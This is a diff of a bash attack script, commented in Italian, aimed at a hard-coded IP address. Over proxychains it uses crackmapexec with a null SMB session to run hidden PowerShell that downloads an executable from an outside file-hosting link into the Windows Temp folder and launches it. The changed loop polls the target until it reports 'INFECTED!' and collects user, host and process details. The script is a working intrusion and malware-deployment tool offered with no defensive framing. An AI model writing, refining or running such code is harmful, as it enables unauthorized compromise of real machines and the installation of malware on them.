@@ -1,8 +1,8 @@
 #!/bin/bash
 TARGET="186.57.237.126"
-EDGEONE_URL="https://www.directfiles.link/RPUVE0X8H"  # ← CAMBIA QUI!
+EDGEONE_URL="https://www.directfiles.link/RPUVE0X8H"
 
-# Deploy + Log
+# Deploy (stesso)
 proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
 powershell -nop -w hidden -c '
 \$wc=New-Object Net.WebClient;
@@ -13,18 +13,28 @@ Start-Process \"C:\\Windows\\Temp\\trustedf57.exe\" -WindowStyle Hidden;
 '
 "
 
-# Monitor migliorato (processi + file + log)
-for i in {1..30}; do  # 30x invece 60x (2.5min)
-  echo "[$i/30] 🔍 Infection check..."
-  OUTPUT=$(proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
+# Monitor FISSO - salva output in file temporaneo
+echo "🔍 Inizio monitoraggio (2.5min)..."
+for i in {1..30}; do
+  echo "[$i/30] Checking..."
+  
+  # Salva output CME in file temporaneo (evita null bytes)
+  proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
     if(Test-Path 'C:\\Windows\\Temp\\trustedf57.exe'){ '✅ FILE EXISTS' } else { '❌ NO FILE' };
     Get-Process | ?{\$_.ProcessName -like '*trusted*'} | select Name,ID,StartTime;
     Get-Content C:\\Windows\\Temp\\deploy.log -ErrorAction SilentlyContinue;
     hostname; whoami
-  " 2>/dev/null)
+  " 2>/dev/null | tr -d '\000' > /tmp/check_$i.txt  # Rimuovi null bytes
   
-  echo "$OUTPUT"
-  [[ $OUTPUT == *"✅ FILE EXISTS"* || $OUTPUT == *"trusted"* ]] && echo "🎉 INFECTED!" && break
+  # Leggi file pulito
+  if grep -q "✅ FILE EXISTS\|trusted" /tmp/check_$i.txt 2>/dev/null; then
+    echo "🎉 INFECTED! $(cat /tmp/check_$i.txt)"
+    rm -f /tmp/check_$i.txt
+    break
+  fi
+  
+  cat /tmp/check_$i.txt 2>/dev/null || echo "No output"
+  rm -f /tmp/check_$i.txt
   sleep 5
 done
 
@@ -34,4 +44,4 @@ net user; hostname;
 Get-Process | ?{\$_.ProcessName -match 'trustedf57|TRUSTED'};
 dir C:\\Windows\\Temp\\trustedf57.exe; 
 Get-Content C:\\Windows\\Temp\\deploy.log
-"
+" 2>/dev/null | tr -d '\000'
